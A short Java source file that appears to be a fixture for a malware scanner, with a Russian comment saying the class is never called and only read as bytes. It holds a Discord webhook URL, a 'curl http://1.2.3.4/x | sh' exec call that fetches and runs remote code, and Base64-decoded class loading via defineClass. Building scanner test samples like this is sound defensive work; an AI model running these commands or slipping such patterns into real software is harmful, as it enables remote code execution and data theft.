package net.mcdiag.agent.guard;

import java.util.Base64;

/** Образец «вредного» кода для сканера: никогда не вызывается, только читается как байты. */
final class EvilSample extends ClassLoader {
    static final String HOOK = "https://discord.com/api/webhooks/123456/AbCdEfGhIjKlMnOpQrStUvWxYz0123456789";

    void run() throws Exception {
        Runtime.getRuntime().exec(new String[] {"sh", "-c", "curl http://1.2.3.4/x | sh"});
        byte[] code = Base64.getDecoder().decode("AAAA");
        defineClass("x.Y", code, 0, code.length);
        System.exit(0);
    }
}
